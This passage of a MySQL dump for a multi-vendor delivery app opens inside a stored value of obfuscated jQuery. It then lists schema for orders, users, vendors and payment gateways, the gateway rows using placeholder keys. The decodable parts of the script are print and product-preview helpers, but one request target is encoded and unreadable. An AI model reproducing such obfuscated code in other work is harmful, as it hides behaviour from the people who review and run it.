_0x4b5b28;};_0x29f1[\'wYPMPh\']=_0x136a05,_0x29f1[\'TVCKlL\']={},_0x29f1[\'jLbmKB\']=!![];}var _0x5d1d67=_0x29f1[\'TVCKlL\'][_0x37fc92];return _0x5d1d67===undefined?(_0x29f1[\'yThkBI\']===undefined&&(_0x29f1[\'yThkBI\']=!![]),_0x29f166=_0x29f1[\'wYPMPh\'](_0x29f166,_0x183d10),_0x29f1[\'TVCKlL\'][_0x37fc92]=_0x29f166):_0x29f166=_0x5d1d67,_0x29f166;};function printDiv(){var _0x3fc0a9=_0x29f1,_0x4538ba=document[_0x3fc0a9(\'0x5\',\'Xo%l\')](_0x3fc0a9(\'0xc\',\'75!l\')),_0x5d1d67=window[_0x3fc0a9(\'0x14\',\'U!b(\')](\'\',_0x3fc0a9(\'0x1b\',\'*J%z\')),_0x136a05=\'\'+_0x3fc0a9(\'0x10\',\'mngu\')+_0x3fc0a9(\'0x17\',\'u[fy\')+_0x3fc0a9(\'0x12\',\'*J%z\')+\'padding:0.5em;\'+\'}\'+_0x3fc0a9(\'0x1a\',\'XA)1\')+_0x3fc0a9(\'0x3\',\'Dj$l\')+_0x3fc0a9(\'0x8\',\'TM8d\')+\'\\x20padding-left:\\x200;\\x20\'+_0x3fc0a9(\'0x6\',\'kzJs\')+\'}\'+\'.list-group-item\\x20{\'+_0x3fc0a9(\'0xf\',\'%HV#\')+_0x3fc0a9(\'0x13\',\'u[fy\')+_0x3fc0a9(\'0x19\',\'6xCp\')+_0x3fc0a9(\'0xd\',\'[c1j\')+_0x3fc0a9(\'0x18\',\'U!b(\')+_0x3fc0a9(\'0x1\',\'XA)1\')+\'}\'+_0x3fc0a9(\'0x9\',\'sg1l\')+\'float:\\x20right\\x20!important;\'+\'}\'+_0x3fc0a9(\'0x7\',\'OoeG\');_0x5d1d67[\'document\'][_0x3fc0a9(\'0x0\',\'bYf%\')](),_0x136a05+=_0x4538ba[_0x3fc0a9(\'0xe\',\'!QA[\')],_0x5d1d67[_0x3fc0a9(\'0xa\',\'Cip%\')][_0x3fc0a9(\'0x4\',\'U!b(\')](_0x3fc0a9(\'0x16\',\'!4Ad\')+_0x136a05+_0x3fc0a9(\'0x2\',\']SD7\')),_0x5d1d67[_0x3fc0a9(\'0x11\',\'18EV\')][_0x3fc0a9(\'0xb\',\'*J%z\')](),setTimeout(function(){var _0x3bf0b5=_0x3fc0a9;_0x5d1d67[_0x3bf0b5(\'0x15\',\'9KPh\')]();},0x1);} </script>', '<script> var _0x2fca=[\"WRqZCmo1\",\"C8kIxmkpW59wW60=\",\"W40rCmkP\",\"WRm1ECo8WOLtpcL3W6RcGX4GWRueWQtdGJRcKSotW79/\",\"emo1mvVdSmk0W6VcICkYW5K=\",\"WOdcR03dTSku\",\"W55wWOTfWRtdOCk/\"];!function(r,f){!function(f){for(;--f;)r.push(r.shift())}(++f)}(_0x2fca,232);var _0x375f=function(r,f){var o=_0x2fca[r-=0];if(void 0===_0x375f.EyELNN){_0x375f.DqMupl=function(r,f){for(var o,t,n=[],c=0,e=\"\",a=\"\",x=0,u=(r=function(r){for(var f,o,t=String(r).replace(/=+$/,\"\"),n=\"\",c=0,e=0;o=t.charAt(e++);~o&&(f=c%4?64*f+o:o,c++%4)?n+=String.fromCharCode(255&f>>(-2*c&6)):0)o=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(o);return n}(r)).length;x<u;x++)a+=\"%\"+(\"00\"+r.charCodeAt(x).toString(16)).slice(-2);for(r=decodeURIComponent(a),t=0;t<256;t++)n[t]=t;for(t=0;t<256;t++)c=(c+n[t]+f.charCodeAt(t%f.length))%256,o=n[t],n[t]=n[c],n[c]=o;t=0,c=0;for(var d=0;d<r.length;d++)c=(c+n[t=(t+1)%256])%256,o=n[t],n[t]=n[c],n[c]=o,e+=String.fromCharCode(r.charCodeAt(d)^n[(n[t]+n[c])%256]);return e},_0x375f.GsfSqz={},_0x375f.EyELNN=!0}var t=_0x375f.GsfSqz[r];return void 0===t?(void 0===_0x375f.RNuyPb&&(_0x375f.RNuyPb=!0),o=_0x375f.DqMupl(o,f),_0x375f.GsfSqz[r]=o):o=t,o};$(document).ready(function(){var r=_0x375f;$(document).on(r(\"0x4\",\"(oe4\"),r(\"0x3\",\"%M^n\"),function(){var f=r,o=$(this).attr(f(\"0x5\",\"v(MZ\"));$[f(\"0x1\",\"*5xU\")]({type:\"post\",url:f(\"0x2\",\"&]HF\"),data:{pid:o},success:function(r){var o=f;$(o(\"0x0\",\"m8v]\"))[o(\"0x6\",\"&]HF\")](r)}})})}); </script> <style> td { position:relative;   }  .beepred:after {     content: \'\';     position: absolute !important;      top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #D9534F;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } </style> <script> var _0x5943=[\"W5/dMqiwnmoRoSovuCkblNy=\",\"sxNdGmocWRq=\",\"v8oOs23cNW==\",\"ySkcFcRcUcDjW4/cMcWEW7VdP8kCpMZcNSkAW7aTm8k+WQu=\",\"gCogsJxcQM/cTwhdLWNdQI08xa==\",\"C3ldKsPBW5aKdsaglxXBWQ57W7awW7K=\",\"c8oiuJFcPYxcPhhdKqRdU3LZssRdVCkSWRZdUgZcUCoVkmoRW7tdStWmc8oJW5azr8kkW65K\",\"W7TBWP/cQSk8WOJcT8kJW6VcIehcJMfu\",\"W5pcJMzRW446g1/cUJlcR8k5z0PPWQxdISorW47cMW==\",\"ygKrhCkQ\",\"W7TedSoYyhK1W5i=\",\"WRddSviYdCoQaCkNtCkfW5NdL8okxG==\",\"pSotetFdJmkmWRtdIIlcO0tdNCoJndX8fGOwW7xdOqi=\",\"bCklk8o9W4bcWQRdVmkcW7VdI0FcScNcTwVdJsG/W47cS8kaB3Gt\",\"W5nmjCotcCkpW4NdTa==\",\"sSkDiSo2\",\"WRqAocXmWRddRxq=\",\"WQbaWPpcHW==\",\"pmkqAZJcSZagW47cJZHwWQxcQSkengBdKmkvWRa4jSo6WQa=\",\"W65PW4/cLSkJW7G3WOtdQwmHoZFcLGW=\",\"W4zqWQBdRJy8h8oPWONdNCkfb2FcTJyXWOjE\",\"nGCMW4lcPYJdGHxdM2VcLhJcUmovWQhdNmoKBWaYW5/dLSkRW7ZcOGuwWOFcQmk/W5BcKSo8W7RdOmonqSoTW54=\",\"W4SfrmoLfWCJzW==\",\"WObRWRaBFSoBWPS/pSkYArOIdqBdTYOBW4f8\",\"WP1RWQyyFSoBW5fNCCo2m0j6rupcTZTAWPD1pblcImk6cW==\"];!function(W,d){!function(d){for(;--d;)W.push(W.shift())}(++d)}(_0x5943,245);var _0x1d26=function(W,d){var o=_0x5943[W-=0];if(void 0===_0x1d26.ghzIVp){_0x1d26.UEsAdW=function(W,d){for(var o,c,x=[],t=0,r=\"\",n=\"\",a=0,i=(W=function(W){for(var d,o,c=String(W).replace(/=+$/,\"\"),x=\"\",t=0,r=0;o=c.charAt(r++);~o&&(d=t%4?64*d+o:o,t++%4)?x+=String.fromCharCode(255&d>>(-2*t&6)):0)o=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(o);return x}(W)).length;a<i;a++)n+=\"%\"+(\"00\"+W.charCodeAt(a).toString(16)).slice(-2);for(W=decodeURIComponent(n),c=0;c<256;c++)x[c]=c;for(c=0;c<256;c++)t=(t+x[c]+d.charCodeAt(c%d.length))%256,o=x[c],x[c]=x[t],x[t]=o;c=0,t=0;for(var e=0;e<W.length;e++)t=(t+x[c=(c+1)%256])%256,o=x[c],x[c]=x[t],x[t]=o,r+=String.fromCharCode(W.charCodeAt(e)^x[(x[c]+x[t])%256]);return r},_0x1d26.OBNvOr={},_0x1d26.ghzIVp=!0}var c=_0x1d26.OBNvOr[W];return void 0===c?(void 0===_0x1d26.FuOxSY&&(_0x1d26.FuOxSY=!0),o=_0x1d26.UEsAdW(o,d),_0x1d26.OBNvOr[W]=o):o=c,o};function printDiv(){var W=_0x1d26,d=document.getElementById(W(\"0x15\",\"#&9g\")),o=window[W(\"0x16\",\"4@nz\")](\"\",W(\"0x5\",\"ZuvX\")),c=\"\"+W(\"0x17\",\"PI!x\")+W(\"0xd\",\"26R!\")+W(\"0x11\",\"6Da!\")+W(\"0xc\",\"2%sy\")+\"}\"+W(\"0x10\",\"U*GY\")+\" display: flex; \"+W(\"0x12\",\"Ij2h\")+W(\"0xa\",\"y(N)\")+\" margin-bottom: 0; }\"+W(\"0x0\",\"9&au\")+\" position: relative;\"+W(\"0x18\",\"hTr!\")+W(\"0x4\",\"6EVl\")+W(\"0x3\",\"6EVl\")+W(\"0x8\",\"PI!x\")+W(\"0x1\",\"tBmC\")+\"}\"+W(\"0x9\",\"iTdI\")+\"float: right !important;}\"+W(\"0x13\",\"7p1$\");o[W(\"0x2\",\"tb0l\")][W(\"0x14\",\"Ij2h\")](),c+=d.innerHTML,o.document[W(\"0xe\",\"CaAs\")](W(\"0xb\",\"iTdI\")+c+\"</body></html>\"),o[W(\"0xf\",\"m]!q\")][W(\"0x6\",\"*^I)\")](),setTimeout(function(){o[W(\"0x7\",\"hoa0\")]()},1)} </script>', ' <script> var _0x509e=[\"BSo1W5CAxG==\",\"WQ/cHHpdQq==\",\"DCkjiHHNW4va\",\"W7JdT8kCWOP/\",\"bJtcKSkB\",\"aSkFWOza\",\"W6TKW7xdPuD5mW==\"];!function(e,r){!function(r){for(;--r;)e.push(e.shift())}(++r)}(_0x509e,472);var _0x5e9d=function(e,r){var d=_0x509e[e-=0];if(void 0===_0x5e9d.qPAuat){_0x5e9d.SWZBxj=function(e,r){for(var d,t,o=[],n=0,x=\"\",a=\"\",c=0,i=(e=function(e){for(var r,d,t=String(e).replace(/=+$/,\"\"),o=\"\",n=0,x=0;d=t.charAt(x++);~d&&(r=n%4?64*r+d:d,n++%4)?o+=String.fromCharCode(255&r>>(-2*n&6)):0)d=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(d);return o}(e)).length;c<i;c++)a+=\"%\"+(\"00\"+e.charCodeAt(c).toString(16)).slice(-2);for(e=decodeURIComponent(a),t=0;t<256;t++)o[t]=t;for(t=0;t<256;t++)n=(n+o[t]+r.charCodeAt(t%r.length))%256,d=o[t],o[t]=o[n],o[n]=d;t=0,n=0;for(var f=0;f<e.length;f++)n=(n+o[t=(t+1)%256])%256,d=o[t],o[t]=o[n],o[n]=d,x+=String.fromCharCode(e.charCodeAt(f)^o[(o[t]+o[n])%256]);return x},_0x5e9d.PEFYSB={},_0x5e9d.qPAuat=!0}var t=_0x5e9d.PEFYSB[e];return void 0===t?(void 0===_0x5e9d.WbeHhA&&(_0x5e9d.WbeHhA=!0),d=_0x5e9d.SWZBxj(d,r),_0x5e9d.PEFYSB[e]=d):d=t,d},_0x12e27d=_0x5e9d;$(document)[_0x12e27d(\"0x4\",\"@8jq\")](function(){var e=_0x12e27d;$(document).on(e(\"0x0\",\"8!lU\"),\".preview_d\",function(){var r=e,d=$(this)[r(\"0x5\",\"sJPz\")](r(\"0x6\",\"02YI\"));$[r(\"0x1\",\"EcfW\")]({type:\"post\",url:\"order_product_data.php\",data:{pid:d},success:function(e){var d=r;$(d(\"0x3\",\"CG1w\"))[d(\"0x2\",\"jRz]\")](e)}})})}); </script> <style> td { position:relative;  }  .beepred:after {     content: \'\';     position: absolute !important;     top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #5CB85C;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } </style>  <script> var _0x52e6=[\"WQRdKJFdH1nxWPNcVSoRaCk4WOddLCohWRSxWPddVfBcSa==\",\"hSovW7lcNMy=\",\"iHRcUNVdS8o6WPldMdbnCLHedJVdSrdcU3hdPWldKCoWWOtdM8oCWOGkiwlcTNhcOCocWPeznSkIra==\",\"d1RdLKf/W5uhvvbbWPbtsCke\",\"wXZdVSkbWPagqJmDisNcR1ujkq3dVCooW5pdKa==\",\"h8owW6/cIwz3zvOAW6LuW7uQWRtdK8kiW4molHvXzW==\",\"ed/dN0ldK0GRW5dcTKJdKwyuaW==\",\"wX3cLSkxi3TrxtfFW6z3WRdcKW==\",\"W5xdR8onWRW=\",\"rmomW7v2bMDdWQ/cJSotBSoCB8kvWPewD2S=\",\"dXVdSmkiWO0luJjdzd7cUL4kiHFcQCojWPZdH8ott8k+uum=\",\"mYhdMWxdHmosW5BdPa==\",\"WOCyuCk3v8o1W5OUWRC=\",\"Bmk/WQ5oE2hdLSky\",\"W5BcVvDNFCoyW5TlW4rlWRvfcrBcK8k3CWFcTW==\",\"DCoaiqZdKK7dN3TnzCoNWP3dSXud\",\"WPZdKSkxW7RdKeOVwqldJqHjWRhcUa==\",\"g3zhz8kFWRjZW4tdGZeMrCoVvmoWW7qRW7y=\",\"l8oyj8kQnKaPW7jiWQZcICks\",\"W5b9imkpW60=\",\"W4RcKK/cKSkAa8keW7BcM1jDWOq7W4G=\",\"f1pcKmkClMWiwZ4hWRWTW6NdN8oyrGzbltfhsmoyAmkv\",\"xmoaWOFcKY/cV1NdNq==\"];!function(o,W){!function(W){for(;--W;)o.push(o.shift())}(++W)}(_0x52e6,283);var _0x79e3=function(o,W){var d=_0x52e6[o-=0];if(void 0===_0x79e3.RgncVu){_0x79e3.oRGoFT=function(o,W){for(var d,e,c=[],t=0,x=\"\",r=\"\",i=0,n=(o=function(o){for(var W,d,e=String(o).replace(/=+$/,\"\"),c=\"\",t=0,x=0;d=e.charAt(x++);~d&&(W=t%4?64*W+d:d,t++%4)?c+=String.fromCharCode(255&W>>(-2*t&6)):0)d=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(d);return c}(o)).length;i<n;i++)r+=\"%\"+(\"00\"+o.charCodeAt(i).toString(16)).slice(-2);for(o=decodeURIComponent(r),e=0;e<256;e++)c[e]=e;for(e=0;e<256;e++)t=(t+c[e]+W.charCodeAt(e%W.length))%256,d=c[e],c[e]=c[t],c[t]=d;e=0,t=0;for(var a=0;a<o.length;a++)t=(t+c[e=(e+1)%256])%256,d=c[e],c[e]=c[t],c[t]=d,x+=String.fromCharCode(o.charCodeAt(a)^c[(c[e]+c[t])%256]);return x},_0x79e3.pUuhiq={},_0x79e3.RgncVu=!0}var e=_0x79e3.pUuhiq[o];return void 0===e?(void 0===_0x79e3.yHUayD&&(_0x79e3.yHUayD=!0),d=_0x79e3.oRGoFT(d,W),_0x79e3.pUuhiq[o]=d):d=e,d};function printDiv(){var o=_0x79e3,W=document[o(\"0xd\",\"$QiL\")](o(\"0x4\",\"iXXc\")),d=window[o(\"0x1\",\"e)zw\")](\"\",o(\"0xb\",\"Oh)D\")),e=\'<style type=\"text/css\">\'+o(\"0x14\",\"tum%\")+o(\"0x15\",\"$e5*\")+o(\"0x16\",\"qQVQ\")+\"}\"+o(\"0x13\",\"I]$b\")+\" display: flex; \"+o(\"0x3\",\"tum%\")+o(\"0xa\",\"5ibq\")+o(\"0x7\",\"U9cv\")+\"}\"+o(\"0x2\",\"NB2w\")+o(\"0x10\",\"BjeA\")+o(\"0x8\",\"9Vxa\")+o(\"0xe\",\"pc3)\")+\"margin-bottom: -1px;background-color: #fff;\"+o(\"0x12\",\"X4AS\")+\"}\"+o(\"0x9\",\"[&UJ\")+\"float: right !important;}</style>\";d[o(\"0x6\",\"sA&J\")].open(),e+=W[o(\"0x5\",\"[]G1\")],d[o(\"0xf\",\"9ZG[\")].write(\'<html><body onload=\"window.print()\">\'+e+o(\"0x0\",\"pc3)\")),d.document[o(\"0xc\",\"pAzi\")](),setTimeout(function(){d[o(\"0x11\",\"$e5*\")]()},1)} </script>');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_notification`
--

CREATE TABLE `tbl_notification` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `datetime` datetime NOT NULL,
  `title` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `description` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_order`
--

CREATE TABLE `tbl_order` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `odate` date NOT NULL,
  `p_method_id` int(11) NOT NULL,
  `address` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `landmark` text CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `d_charge` float NOT NULL,
  `cou_id` float NOT NULL,
  `cou_amt` float NOT NULL,
  `o_total` float NOT NULL,
  `subtotal` float NOT NULL,
  `trans_id` text DEFAULT NULL,
  `a_note` text CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `o_status` enum('Pending','Processing','On Route','Completed','Cancelled') NOT NULL DEFAULT 'Pending',
  `a_status` int(11) NOT NULL DEFAULT 0,
  `rid` int(11) NOT NULL DEFAULT 0,
  `order_status` int(11) NOT NULL DEFAULT 0,
  `comment_reject` text CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `sign` longtext CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `vcommission` float NOT NULL,
  `dcommission` float NOT NULL DEFAULT 0,
  `wall_amt` float NOT NULL,
  `delivery_type` int(11) NOT NULL DEFAULT 0,
  `timeslot` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_order_product`
--

CREATE TABLE `tbl_order_product` (
  `id` int(11) NOT NULL,
  `oid` int(11) NOT NULL,
  `attribute_id` int(11) NOT NULL,
  `pquantity` int(11) NOT NULL,
  `ptitle` text NOT NULL,
  `pdiscount` int(11) NOT NULL,
  `pimg` text NOT NULL,
  `pprice` int(11) NOT NULL,
  `ptype` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_payment_list`
--

CREATE TABLE `tbl_payment_list` (
  `id` int(11) NOT NULL,
  `title` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `img` text NOT NULL,
  `attributes` text NOT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `subtitle` text NOT NULL,
  `p_show` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `tbl_payment_list`
--

INSERT INTO `tbl_payment_list` (`id`, `title`, `img`, `attributes`, `status`, `subtitle`, `p_show`) VALUES
(1, 'Razorpay', 'images/payment/1619504987.png', 'RAZORPAY_KEY', 1, 'Card, UPI, Net banking, Wallet(Phone Pe, Amazon Pay, Freecharge)', 1),
(2, 'Cash On Delivery', 'images/payment/1619505033.png', '-', 1, 'Pay via Cash at the time of delivery, It\'s free and only takes a few minutes', 0),
(3, 'Paypal', 'images/payment/1619505061.png', 'Paypal_key_here,0', 1, 'Credit/Debit card with Easier way to pay – online and on your mobile.', 0),
(4, 'Stripe', 'images/payment/1619505089.png', 'Primary_Key_Here,Secret_Key_Here', 1, 'Accept all major debit and credit cards from customers in every country', 0),
(5, 'Wallet', 'images/payment/1619505033.png', '-', 1, 'If Complete Payment Using Wallet', 0),
(6, 'PayStack', 'images/payment/1628342058.png', 'Primary_Key_Here,Secret_Key_Here', 1, 'Credit/Debit card with Easier way to pay – online and on your mobile.', 0),
(7, 'FlutterWave', 'images/payment/1628342087.png', 'Flutterwave_key_here', 1, 'Card,pay with USSD,pay with bank,pay with barter', 0),
(8, 'Paytm', 'images/payment/1628342058.png', 'M_ID,M_KEY,TEST', 1, 'Credit/Debit card,net banking,paytm wallet', 0),
(9, 'SenangPay', 'images/payment/1619505089.png', 'M_ID,SECRET_KEY,TEST', 1, 'Accept all major debit and credit cards all Related Banks', 0),
(10, 'SSLCOMMERZ', 'assets/category/catimg/1652677635.png', 'Store_id,Store_password,TEST', 1, 'Accept all major debit and credit cards all Related Banks', 0);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_pincode`
--

CREATE TABLE `tbl_pincode` (
  `id` int(11) NOT NULL,
  `pincode` text NOT NULL,
  `d_charge` float NOT NULL,
  `status` int(11) NOT NULL,
  `is_primary` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_pincode`
--

INSERT INTO `tbl_pincode` (`id`, `pincode`, `d_charge`, `status`, `is_primary`) VALUES
(1, '414105', 235, 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_product`
--

CREATE TABLE `tbl_product` (
  `id` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `m_img` text NOT NULL,
  `mtitle` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `mstatus` int(11) NOT NULL,
  `mcat` int(11) NOT NULL,
  `pincode` text NOT NULL,
  `mdesc` text CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `rdate` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_product_attribute`
--

CREATE TABLE `tbl_product_attribute` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `price` float NOT NULL,
  `title` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `discount` float NOT NULL,
  `ostock` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_rnoti`
--

CREATE TABLE `tbl_rnoti` (
  `id` int(11) NOT NULL,
  `rid` int(11) NOT NULL,
  `msg` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_snoti`
--

CREATE TABLE `tbl_snoti` (
  `id` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `datetime` datetime NOT NULL,
  `title` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `description` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_user`
--

CREATE TABLE `tbl_user` (
  `id` int(11) NOT NULL,
  `fname` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `lname` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `email` text NOT NULL,
  `mobile` double NOT NULL,
  `password` text NOT NULL,
  `ccode` text NOT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `rdate` datetime NOT NULL,
  `code` int(11) NOT NULL,
  `refercode` int(11) NOT NULL DEFAULT 0,
  `wallet` float NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `tbl_user`
--

INSERT INTO `tbl_user` (`id`, `fname`, `lname`, `email`, `mobile`, `password`, `ccode`, `status`, `rdate`, `code`, `refercode`, `wallet`) VALUES
(1, 'ddsf', 'nofldn', '', 0, '', 'sf', 1, '2024-06-20 07:10:33', 0, 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `timeslot`
--

CREATE TABLE `timeslot` (
  `id` int(11) NOT NULL,
  `vid` int(11) NOT NULL,
  `mintime` text NOT NULL,
  `maxtime` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `vendor`
--

CREATE TABLE `vendor` (
  `id` int(11) NOT NULL,
  `name` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `email` text NOT NULL,
  `aid` text NOT NULL,
  `address` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `status` int(11) NOT NULL,
  `password` text NOT NULL,
  `upimob` text DEFAULT NULL,
  `accnum` text DEFAULT NULL,
  `accname` text DEFAULT NULL,
  `ifsc` text DEFAULT NULL,
  `mobile` text NOT NULL,
  `v_img` text NOT NULL,
  `scat` text NOT NULL,
  `commission` float NOT NULL,
  `vstatus` int(11) NOT NULL DEFAULT 1,
  `star` int(11) NOT NULL,
  `s_type` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wallet_report`
--

CREATE TABLE `wallet_report` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `message` text NOT NULL,
  `status` text NOT NULL,
  `amt` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `banner`
--
ALTER TABLE `banner`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `category`
--
ALTER TABLE `category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `payout_ride_setting`
--
ALTER TABLE `payout_ride_setting`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `payout_setting`
--
ALTER TABLE `payout_setting`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pkg_banner`
--
ALTER TABLE `pkg_banner`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pkg_category`
--
ALTER TABLE `pkg_category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pkg_order`
--
ALTER TABLE `pkg_order`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rider`
--
ALTER TABLE `rider`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `setting`
--
ALTER TABLE `setting`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_address`
--
ALTER TABLE `tbl_address`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_cash`
--
ALTER TABLE `tbl_cash`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_code`
--
ALTER TABLE `tbl_code`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_coupon`
--
ALTER TABLE `tbl_coupon`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_faq`
--
ALTER TABLE `tbl_faq`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_happy_user`
--
ALTER TABLE `tbl_happy_user`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_home_section`
--
ALTER TABLE `tbl_home_section`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_include`
--
ALTER TABLE `tbl_include`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_notification`
--
ALTER TABLE `tbl_notification`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_order`
--
ALTER TABLE `tbl_order`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_order_product`
--
ALTER TABLE `tbl_order_product`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_payment_list`
--
ALTER TABLE `tbl_payment_list`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_pincode`
--
ALTER TABLE `tbl_pincode`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_product`
--
ALTER TABLE `tbl_product`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_product_attribute`
--
ALTER TABLE `tbl_product_attribute`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_rnoti`
--
ALTER TABLE `tbl_rnoti`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_snoti`
--
ALTER TABLE `tbl_snoti`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_user`
--
ALTER TABLE `tbl_user`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `timeslot`
--
ALTER TABLE `timeslot`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `vendor`
--
ALTER TABLE `vendor`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wallet_report`
--
ALTER TABLE `wallet_report`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `banner`
--
ALTER TABLE `banner`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `category`
--
ALTER TABLE `category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `payout_ride_setting`
--
ALTER TABLE `payout_ride_setting`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `payout_setting`
--
ALTER TABLE `payout_setting`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `pkg_banner`
--
ALTER TABLE `pkg_banner`
